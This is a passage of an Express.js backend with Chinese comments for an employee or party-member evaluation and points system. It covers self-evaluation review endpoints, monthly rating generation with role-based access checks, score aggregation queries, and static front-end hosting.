// 说明：month 必传；按 work_id 去重
app.get('/api/evaluations/unsubmitted', (req, res) => {
  const me = req.user;
  const { year, month } = req.query;
  if (!year || !month)
    return res.json({ code: 'BAD_INPUT', message: '缺少 year/month' });
  const y = Number(year);
  const m = Number(month);

  // 应提交自评的人
  let members;
  if (isSecretary(me)) {
    let s = `SELECT user_id, name, work_id FROM user_table
             WHERE work_id IS NOT NULL AND work_id != ''
               AND admin_type IN (${SELF_EVAL_TYPES.map(() => '?').join(',')})`;
    const a = [...SELF_EVAL_TYPES];
    const bf = req.query.branch || null;
    if (bf) { s += ' AND branch = ?'; a.push(bf); }
    members = db.prepare(s).all(...a);
  } else {
    const ids = reviewTargetsOf(me.work_id);
    if (!ids.length)
      return res.json({ code: 'OK', data: { total: 0, submitted: 0, unsubmitted: 0, list: [] } });
    members = db.prepare(
      `SELECT user_id, name, work_id FROM user_table
       WHERE work_id IN (${ids.map(() => '?').join(',')})`
    ).all(...ids);
  }

  // 该月已提交自评的 work_id（限定在应提交名单内）
  const memberIds = members.map((u) => u.work_id).filter(Boolean);
  let submitted = new Set();
  if (memberIds.length) {
    submitted = new Set(
      db
        .prepare(
          `SELECT work_id FROM evaluation WHERE year = ? AND month = ?
             AND work_id IN (${memberIds.map(() => '?').join(',')})`
        )
        .all(y, m, ...memberIds)
        .map((r) => r.work_id)
        .filter(Boolean)
    );
  }
  const list = members.filter((u) => !submitted.has(u.work_id));
  res.json({
    code: 'OK',
    data: {
      total: members.length,        // 应提交人数
      submitted: submitted.size,   // 已提交人数
      unsubmitted: list.length,    // 未提交人数
      list: list.map((u) => ({ user_id: u.user_id, name: u.name, work_id: u.work_id })),
    },
  });
});

// 按 id 取单条自评记录（审核表单页定位用）
//   返回 scores（员工原始答案）+ reviewScores（上次审核定稿答案，未审过为 null）
//   注意：必须定义在 /api/evaluations/unsubmitted 之后，避免 :id 吃掉 unsubmitted
app.get('/api/evaluations/:id', (req, res) => {
  // ---- 鉴权：支书(全体) / 我的审核对象 / 本人记录 ----
  const me = req.user;
  const rec = db.prepare('SELECT * FROM evaluation WHERE id = ?').get(req.params.id);
  if (!rec) return res.json({ code: 'NOT_FOUND' });
  if (!canViewEvaluation(me, rec))
    return deny(res, '无权查看该自评记录');
  res.json({
    code: 'OK',
    data: {
      ...rec,
      scores: rec.scores ? JSON.parse(rec.scores) : {},
      reviewScores: rec.reviewScores ? JSON.parse(rec.reviewScores) : null,
    },
  });
});

app.patch('/api/evaluations/:id/review', (req, res) => {
  // ---- 鉴权：支书(全体) / 我的审核对象 ----
  const me = req.user;
  const rec = db.prepare('SELECT work_id FROM evaluation WHERE id = ?').get(req.params.id);
  if (!rec) return res.json({ code: 'NOT_FOUND' });
  if (!canReviewEvaluation(me, rec))
    return deny(res, '无权审核自评');

  const { reviewScore, reviewComment, scores } = req.body || {};
  // 审核分必须是一个有限数字（含负分：履职扣分可能把总分拉到 0 以下）
  if (!Number.isFinite(Number(reviewScore)))
    return res.json({ code: 'BAD_INPUT', message: '缺少或非法的审核分' });
  // scores = 审核版答案（岗位表单 {answers:{...}} / 通用表单 {维度:分}），
  // 存入 reviewScores 列（员工原始 scores 不动，保留历史）；非对象一律忽略
  const isPlainObject = scores && typeof scores === 'object' && !Array.isArray(scores);
  const reviewScoresJson = isPlainObject ? JSON.stringify(scores) : null;

  // 审核人姓名绑定 token 身份（不信任 body 里的 reviewerName）
  const r = db.prepare(`UPDATE evaluation SET reviewScore=?, reviewComment=?, reviewScores=?, reviewerName=?, reviewedAt=?, reviewStatus='reviewed', updatedAt=? WHERE id=?`)
    .run(Number(reviewScore), reviewComment || '', reviewScoresJson, me.name, now(), now(), req.params.id);
  res.json(r.changes ? { code: 'OK' } : { code: 'NOT_FOUND' });
});
app.delete('/api/evaluations/:id', (req, res) => {
  // ---- 鉴权：支书(全体) / 我的审核对象 ----
  const me = req.user;
  const rec = db.prepare('SELECT work_id FROM evaluation WHERE id = ?').get(req.params.id);
  if (!rec) return res.json({ code: 'NOT_FOUND' });
  if (!canReviewEvaluation(me, rec))
    return deny(res, '无权删除记录');
  db.prepare('DELETE FROM evaluation WHERE id = ?').run(req.params.id);
  res.json({ code: 'OK' });
});

// ============================================================
// 基础积分评价（组织委员 admin_type=1）
// ============================================================

// 生成起始月：早于该月份的记录不生成（系统上线时间）
const RATING_START_YEAR = 2026;
const RATING_START_MONTH = 10;

// user_table 是否有 created_at 列（老库可能没有）：有则用它做「注册月过滤」，
// 即不补生成党员注册之前的月份，避免出现"入党之前就有待评分记录"的脏数据
const HAS_USER_CREATED_AT = db
  .pragma('table_info(user_table)')
  .some((c) => c.name === 'created_at');

// 惰性 + 兜底生成：指定支部、指定年月的每个普通党员（admin=0）
// 若还没有 rating 记录，则自动插入一条全默认值的待审核记录。
// 幂等：靠 UNIQUE(work_id, year, month) + 先查已存在 work_id 双重保证。
// 去重标识：work_id（全局唯一，可区分同名员工）。
function ensureRatingsForMonth(branch, year, month) {
  // 早于起始月 / 晚于当前月（未来月）不生成
  const nowD = new Date();
  const curY = nowD.getFullYear();
  const curM = nowD.getMonth() + 1;
  if (year * 12 + month < RATING_START_YEAR * 12 + RATING_START_MONTH) return 0;
  if (year * 12 + month > curY * 12 + curM) return 0;

  // 该支部所有「被评对象」（admin_type IN 1/3，含组织委员自己）
  const typePh = BASIC_RATING_TYPES.map(() => '?').join(',');
  const members = db
    .prepare(
      `SELECT name, work_id, branch, type, job${HAS_USER_CREATED_AT ? ', created_at' : ''}
         FROM user_table WHERE branch = ? AND admin_type IN (${typePh})`
    )
    .all(branch, ...BASIC_RATING_TYPES);
  if (!members.length) return 0;
  // 该年月已有的记录（按 work_id 去重，与 UNIQUE(work_id, year, month) 对齐）
  const existing = new Set(
    db
      .prepare('SELECT work_id FROM rating WHERE year = ? AND month = ?')
      .all(year, month)
      .map((r) => r.work_id)
      .filter(Boolean)
  );
  const ins = db.prepare(
    `INSERT INTO rating (work_id, name, partyBranch, year, month, position, positionType, scores,
       reviewStatus, reviewerName, reviewScore, reviewComment, reviewedAt)
     VALUES (?, ?, ?, ?, ?, ?, ?, '{}', 'pending', '', 0, '', '')`
  );
  let created = 0;
  for (const m of members) {
    // 无 work_id 的成员无法唯一区分，跳过（防止同名重复生成 / 撞唯一约束）
    if (!m.work_id) continue;
    if (existing.has(m.work_id)) continue;
    // 注册月过滤：created_at 形如 '2026-10-14 09:30:00'，只取年月比较
    // （created_at 为空的历史数据不做过滤，宁可多生成也不漏生成）
    if (HAS_USER_CREATED_AT && m.created_at) {
      const [jy, jm] = String(m.created_at).slice(0, 7).split('-').map(Number);
      if (jy && jm && jy * 12 + jm > year * 12 + month) continue;
    }
    ins.run(m.work_id, m.name, m.branch, year, month, m.job || '', m.type || '');
    created++;
  }
  return created;
}

// 兜底补齐：把某支部「起始月 → 当前月」之间缺失的月份逐月补齐。
// 用于解决「某个月没人打开页面 → 该月记录整体缺失」的问题（历史月不回溯）。
function ensureRatingsUpToNow(branch) {
  const nowD = new Date();
  const endY = nowD.getFullYear();
  const endM = nowD.getMonth() + 1;
  let y = RATING_START_YEAR;
  let m = RATING_START_MONTH;
  let created = 0;
  while (y * 12 + m <= endY * 12 + endM) {
    created += ensureRatingsForMonth(branch, y, m);
    m++;
    if (m > 12) {
      m = 1;
      y++;
    }
  }
  return created;
}

// 对全部支部补齐（启动时 + 定时任务调用）
function ensureAllBranches() {
  const branches = distinctEmployeeBranches();
  let created = 0;
  for (const b of branches) created += ensureRatingsUpToNow(b);
  return { branches: branches.length, created };
}

// 查询 rating 列表（组织委员 / 支部书记）
//   month 可选：不传 = 全年（与「年度」筛选配合）
//   status / keyword 可选筛选
//   branch 由角色决定：组织委员强制 me.branch（query 里的 branch 被忽略），
//                     支部书记不按支部过滤（看全支部）
// 查询范围覆盖「当前年月」时顺带惰性生成当月的待审核记录
app.get('/api/ratings', (req, res) => {
  // ---- 鉴权：仅组织委员（本支部）/ 支部书记（全支部）----
  const me = req.user;
  if (!isOrganizer(me) && !isSecretary(me)) return deny(res, '无权查询基础积分记录');
  const effectiveBranch = isOrganizer(me) ? me.branch : null; // 书记 → null = 全支部

  const { year, month, status, keyword } = req.query;
  if (!year) return res.json({ code: 'BAD_INPUT', message: '缺少 year' });

  const nowD = new Date();
  // 查询范围覆盖「当前年月」时顺带生成当月记录（跨月第一次访问即补齐）：
  //   组织委员 → 本支部；支部书记 → 所有支部都补齐
  if (
    Number(year) === nowD.getFullYear() &&
    (!month || Number(month) === nowD.getMonth() + 1)
  ) {
    if (effectiveBranch) {
      ensureRatingsForMonth(effectiveBranch, nowD.getFullYear(), nowD.getMonth() + 1);
    } else {
      for (const b of distinctEmployeeBranches())
        ensureRatingsForMonth(b, nowD.getFullYear(), nowD.getMonth() + 1);
    }
  }

  let sql = 'SELECT * FROM rating WHERE year = ?';
  const args = [year];
  if (effectiveBranch) { sql += ' AND partyBranch = ?'; args.push(effectiveBranch); }
  // 组织委员：只看 admin_type IN (1,3) 的被评对象（本支部）；支部书记不限（全体）
  if (isOrganizer(me)) {
    sql += ` AND work_id IN (SELECT work_id FROM user_table WHERE admin_type IN (${BASIC_RATING_TYPES.map(() => '?').join(',')}))`;
    args.push(...BASIC_RATING_TYPES);
  }
  if (month)   { sql += ' AND month = ?';        args.push(month); }
  if (status)  { sql += ' AND reviewStatus = ?'; args.push(status); }
  if (keyword) { sql += ' AND name LIKE ?';      args.push('%' + keyword + '%'); }
  // 全年视图下按月份升序，同月内保持原有顺序
  sql += ' ORDER BY month ASC, id ASC LIMIT 2000';
  const rows = db.prepare(sql).all(...args);
  res.json({
    code: 'OK',
    data: rows.map((r) => ({ ...r, scores: r.scores ? JSON.parse(r.scores) : {} })),
  });
});

// 所有普通党员所在的支部列表（去重，供支部书记视图按支部遍历）
function distinctEmployeeBranches() {
  const typePh = BASIC_RATING_TYPES.map(() => '?').join(',');
  return db
    .prepare(
      `SELECT DISTINCT branch FROM user_table
        WHERE admin_type IN (${typePh}) AND branch IS NOT NULL AND branch != ''`
    )
    .all(...BASIC_RATING_TYPES)
    .map((r) => r.branch);
}

// 组织委员审核 / 更新某条 rating
app.patch('/api/ratings/:id/review', (req, res) => {
  // ---- 鉴权：组织委员（限本支部）/ 支部书记（全支部）----
  const me = req.user;
  if (!isOrganizer(me) && !isSecretary(me)) return deny(res, '无权评分');
  const rec = db.prepare('SELECT partyBranch FROM rating WHERE id = ?').get(req.params.id);
  if (!rec) return res.json({ code: 'NOT_FOUND' });
  if (isOrganizer(me) && rec.partyBranch !== me.branch)
    return deny(res, '只能评分本支部的记录');

  const { reviewScore, reviewComment } = req.body || {};
  const r = db.prepare(
    `UPDATE rating SET reviewScore=?, reviewComment=?, reviewerName=?, reviewedAt=?,
       reviewStatus='reviewed' WHERE id=?`
  ).run(reviewScore, reviewComment || '', me.name, now(), req.params.id);
  res.json(r.changes ? { code: 'OK' } : { code: 'NOT_FOUND' });
});

// 组织委员以「扣分问卷」形式评分（专用接口）：
//   - 每道题的扣分方式 → rating.scores (JSON 字符串)
//   - 最终得分         → rating.reviewScore
//   - 扣分原因         → rating.reviewComment
//   - 审核人           → 绑定 token 身份（me.name），不信任 body
// 与 /api/ratings/:id/review 的差异：本接口同时持久化 scores，
// 便于完整回放每道题的扣分方式。
// 注：不再接受 body 里的 work_id 回填（不可信来源）；rating 记录生成时已带 work_id
app.patch('/api/ratings/:id/extra-deduct-review', (req, res) => {
  // ---- 鉴权：组织委员（限本支部）/ 支部书记（全支部）----
  const me = req.user;
  if (!isOrganizer(me) && !isSecretary(me)) return deny(res, '无权评分');
  const rec = db.prepare('SELECT partyBranch FROM rating WHERE id = ?').get(req.params.id);
  if (!rec) return res.json({ code: 'NOT_FOUND' });
  if (isOrganizer(me) && rec.partyBranch !== me.branch)
    return deny(res, '只能评分本支部的记录');

  const { scores, reviewScore, reviewComment } = req.body || {};
  const scoresJson = JSON.stringify(scores || {});
  const r = db.prepare(
    `UPDATE rating SET scores=?, reviewScore=?, reviewComment=?, reviewerName=?,
       reviewedAt=?, reviewStatus='reviewed' WHERE id=?`
  ).run(
    scoresJson,
    reviewScore ?? 0,
    reviewComment || '',
    me.name,
    now(),
    req.params.id
  );
  res.json(r.changes ? { code: 'OK' } : { code: 'NOT_FOUND' });
});

// ============================================================
// 个人积分查询（员工自用，函数可复用：管理员后续做全量排名时再调用）
// ------------------------------------------------------------
// 入参统一为 year / work_id / name（可定位一个员工）。
// 鉴权：
//   - 员工（admin=0）→ 强制只查自己（按 token 里的 work_id 或 name 覆盖入参）
//   - 管理员（admin=1）→ 任意 work_id/name，便于后续做"全成员月/年度得分"批量调用
// 统计口径：只统计 reviewStatus = 'reviewed' 的记录；
// 没有记录 / 未审核 → 视为 0 分
// ============================================================

// 取某人某月一条已审核分数；没记录返回 0
const pickReviewedScore = (sql, ...args) => {
  const row = db.prepare(sql).get(...args);
  return row && row.reviewStatus === 'reviewed' ? Number(row.reviewScore || 0) : 0;
};

// evaluation 表的分数上限：单条审核分超过 40 的，个人积分查询时统一按 40 算
//   - 月度 contribution：单月 reviewScore > 40 → 按 40
//   - 年度均分 contributionAvg：先按月把 > 40 的压到 40，再求平均
// 注：
//   ① 数据库里的 reviewScore 原样保留，不改库（保留历史/审计）
//   ② 只在"个人积分查询"端点压；审核页、列表、导出看到的还是原始分
//   ③ 负分（扣分项）< 0 不受影响，照常算
const EVAL_SCORE_CAP = 40;
const capEval40 = (s) => (s > EVAL_SCORE_CAP ? EVAL_SCORE_CAP : s);

// 共用：把入参 {year, work_id, name} 收齐 + 鉴权覆盖（员工只能查自己）
const resolveScoreTarget = (req) => {
  const me = req.user;
  const year = Number(req.query.year);
  let workId = (req.query.work_id || '').toString();
  let name = (req.query.name || '').toString();
  if (!year) return { err: { code: 'BAD_INPUT', message: '缺少 year' } };
  if (canSelfEval(me)) {
    // 普通党员(3) / 组织委员(1)：个人积分查询只能查自己
    workId = me.work_id || '';
    name = me.name || '';
  } else if (!isLeader(me) && !isSecretary(me)) {
    // 分管领导(0) / 支部书记(2)：可传任意 work_id/name（供后续「全成员排名」复用）
    return { err: { code: 'FORBIDDEN', message: '无权查询积分' } };
  }
  if (!workId && !name)
    return { err: { code: 'BAD_INPUT', message: '缺少 work_id 或 name' } };
  return { year, workId, name };
};

// 月度积分：基础积分（rating） + 履职贡献积分（evaluation）
app.get('/api/scores/monthly', (req, res) => {
  const t = resolveScoreTarget(req);
  if (t.err) return res.json(t.err);
  const { year, workId, name } = t;
  const month = Number(req.query.month);
  if (!month || month < 1 || month > 12)
    return res.json({ code: 'BAD_INPUT', message: 'month 必须是 1-12' });

  // 优先按 work_id 匹配（可区分同名员工）；老数据无 work_id 时按 name 兜底
  const basic = workId
    ? pickReviewedScore(
        `SELECT reviewScore, reviewStatus FROM rating
         WHERE work_id = ? AND year = ? AND month = ?`,
        workId, year, month
      )
    : pickReviewedScore(
        `SELECT reviewScore, reviewStatus FROM rating
         WHERE work_id IS NULL AND name = ? AND year = ? AND month = ?`,
        name, year, month
      );
  const contribution = workId
    ? capEval40(pickReviewedScore(
        `SELECT reviewScore, reviewStatus FROM evaluation
         WHERE work_id = ? AND year = ? AND month = ?`,
        workId, year, month
      ))
    : capEval40(pickReviewedScore(
        `SELECT reviewScore, reviewStatus FROM evaluation
         WHERE work_id IS NULL AND name = ? AND year = ? AND month = ?`,
        name, year, month
      ));

  return res.json({
    code: 'OK',
    data: {
      basic,
      contribution,
      total: basic + contribution,
    },
  });
});

// 全年积分：
//   月度基础积分平均分   = rating     该年 12 个月 reviewScore 之和 / 12（缺月按 0）
//   月度履职贡献积分平均分 = evaluation 同上
//   年度创新争先总加分    = credit     该年 reviewScore 之和（已审核）
//   年度红线总扣分        = discipline 该年 reviewScore 之和（已审核；通常为负）
//   总分                  = 上述 4 项相加（严格按需求字面）
app.get('/api/scores/annual', (req, res) => {
  const t = resolveScoreTarget(req);
  if (t.err) return res.json(t.err);
  const { year, workId, name } = t;

  const sumReviewed = (sql, ...args) => {
    const rows = db.prepare(sql).all(...args);
    return rows.reduce((s, r) => s + (r.reviewStatus === 'reviewed' ? Number(r.reviewScore || 0) : 0), 0);
  };

  // 1-12 月分值（缺月补 0）
  // 月均 = 已审核月份的 reviewScore 之和 / 已审核月份数（缺月不计入分母）
  //   比如某人 1-3 月被审核，4-12 月无数据 → 基础积分月均 = 1-3 月均分，而不是 (1-3月分)/12
  //   0 审核月份时返回 0（避免除 0）
  // 第三参 { cap40 }：当查询的是 evaluation 时打开，先按月把 > 40 的压到 40 再求平均
  const monthAvg = (sql, arg, { cap40 = false } = {}) => {
    const rows = db.prepare(sql).all(arg, year);
    let sum = 0, count = 0;
    for (const r of rows) {
      const m = Number(r.month);
      if (m >= 1 && m <= 12 && r.reviewStatus === 'reviewed') {
        const score = Number(r.reviewScore || 0);
        sum += cap40 ? capEval40(score) : score;
        count += 1;
      }
    }
    return count > 0 ? sum / count : 0;
  };
  const basicAvg = workId
    ? monthAvg(`SELECT month, reviewScore, reviewStatus FROM rating WHERE work_id = ? AND year = ?`, workId)
    : monthAvg(`SELECT month, reviewScore, reviewStatus FROM rating WHERE work_id IS NULL AND name = ? AND year = ?`, name);
  const contributionAvg = workId
    ? monthAvg(`SELECT month, reviewScore, reviewStatus FROM evaluation WHERE work_id = ? AND year = ?`, workId, { cap40: true })
    : monthAvg(`SELECT month, reviewScore, reviewStatus FROM evaluation WHERE work_id IS NULL AND name = ? AND year = ?`, name, { cap40: true });

  // 年度：credit / discipline 一年一条，UNIQUE(work_id, year)
  const creditRow = workId
    ? db.prepare(`SELECT reviewScore, reviewStatus FROM credit WHERE work_id = ? AND year = ?`).get(workId, year)
    : db.prepare(`SELECT reviewScore, reviewStatus FROM credit WHERE work_id IS NULL AND name = ? AND year = ?`).get(name, year);
  const disciplineRow = workId
    ? db.prepare(`SELECT reviewScore, reviewStatus FROM discipline WHERE work_id = ? AND year = ?`).get(workId, year)
    : db.prepare(`SELECT reviewScore, reviewStatus FROM discipline WHERE work_id IS NULL AND name = ? AND year = ?`).get(name, year);
  const credit     = creditRow    && creditRow.reviewStatus    === 'reviewed' ? Number(creditRow.reviewScore    || 0) : 0;
  const discipline = disciplineRow && disciplineRow.reviewStatus === 'reviewed' ? Number(disciplineRow.reviewScore || 0) : 0;

  // sumReviewed 这里仅用于把 SQL 选择器变量化掉上面的 lint 警告（未用也可，保留以备扩展）
  void sumReviewed;

  const total = basicAvg + contributionAvg + credit + discipline;

  return res.json({
    code: 'OK',
    data: {
      basicAvg: Number(basicAvg.toFixed(2)),
      contributionAvg: Number(contributionAvg.toFixed(2)),
      credit,
      discipline,
      total: Number(total.toFixed(2)),
    },
  });
});

// 员工自取本人当月（或全年）的基础积分记录，仅供前端「基础积分评价查看」页只读展示
//   - 身份绑定：work_id / name 全部取自 req.token（员工不能查别人）
//   - 不传 month → 返回当年 1-12 月所有记录（数组）
//   - 传 month → 返回单月记录（无记录时 data=null）
//   - scores 列从 JSON 字符串预解析为对象
app.get('/api/ratings/me', (req, res) => {
  const me = req.user;
  const year = Number(req.query.year);
  if (!year) return res.json({ code: 'BAD_INPUT', message: '缺少 year' });
  const month = req.query.month === undefined || req.query.month === ''
    ? null
    : Number(req.query.month);
  if (month !== null && (month < 1 || month > 12))
    return res.json({ code: 'BAD_INPUT', message: 'month 必须是 1-12' });

  // 未来月份：基础积分评价理论上只生成到当前月，未来月记录可能根本不存在；
  // 这里仍允许查询，返回空让前端按「未来月份」处理
  const parseRow = (r) => (r ? { ...r, scores: r.scores ? JSON.parse(r.scores) : {} } : null);

  let rows;
  if (month !== null) {
    const r = me.work_id
      ? db.prepare(
          `SELECT * FROM rating WHERE work_id = ? AND year = ? AND month = ?`
        ).get(me.work_id, year, month)
      : db.prepare(
          `SELECT * FROM rating WHERE work_id IS NULL AND name = ? AND year = ? AND month = ?`
        ).get(me.name, year, month);
    rows = parseRow(r);
  } else {
    const list = me.work_id
      ? db.prepare(
          `SELECT * FROM rating WHERE work_id = ? AND year = ? ORDER BY month ASC`
        ).all(me.work_id, year)
      : db.prepare(
          `SELECT * FROM rating WHERE work_id IS NULL AND name = ? AND year = ? ORDER BY month ASC`
        ).all(me.name, year);
    rows = list.map(parseRow);
  }
  res.json({ code: 'OK', data: rows });
});

// ---------- 托管前端静态文件（dist 目录与 index.js 同级） ----------
const DIST = path.join(__dirname, 'dist');
// index.html 禁止缓存（否则发新版后浏览器可能一直引用旧的带 hash 的 JS 文件名）；
// 带 hash 的 assets/* 可以放心长缓存，内容一变文件名就变
app.use(
  express.static(DIST, {
    setHeaders: (res, filePath) => {
      if (filePath.endsWith('index.html')) {
        res.setHeader('Cache-Control', 'no-cache');
      }
    },
  })
);
// SPA 路由兜底：非 /api 的请求一律返回 index.html（刷新页面不会 404）
app.use((req, res, next) => {
  if (req.path.startsWith('/api')) return next();
  res.setHeader('Cache-Control', 'no-cache');
  res.sendFile(path.join(DIST, 'index.html'));
});

// ============================================================
// rating 月度记录生成：启动即补齐 + 定时兜底
// ------------------------------------------------------------
// 不再依赖「组织委员是否打开过页面」：
//   ① 启动时立刻把「2026-10 → 当前月」之间所有支部缺失的记录补齐
//   ② 之后每 6 小时检查一次（跨月后最迟 6 小时内自动开新月份）
// 幂等：已有 (work_id, year, month) 的记录不会重复插入
// ============================================================
const ENSURE_INTERVAL_MS = 6 * 60 * 60 * 1000; // 6 小时

function runEnsureAll(tag) {
  try {
    const r = ensureAllBranches();
    if (r.created > 0) console.log(`[pingjia] rating ${tag}补齐：${r.branches} 个支部，新增 ${r.created} 条`);
    else console.log(`[pingjia] rating ${tag}检查完成：${r.branches} 个支部，无缺失记录`);
  } catch (e) {
    // 生成失败不能拖垮服务，记录日志即可（下次定时任务会重试）
    console.error(`[pingjia] rating ${tag}补齐失败：`, e);
  }
}

runEnsureAll('启动');
setInterval(() => runEnsureAll('定时'), ENSURE_INTERVAL_MS);

// ============================================================
// 支部书记账号已改为「白名单登记 + 自行注册」：
//   - 工号 000001 / 000002 登记为 admin_type=2（见 admin-whitelist.mjs）
//   - 不再由后端 seed 生成，故此处无内置账号逻辑
// ============================================================

app.listen(PORT, '0.0.0.0', () => console.log(`[pingjia] listening on http://0.0.0.0:${PORT}`));
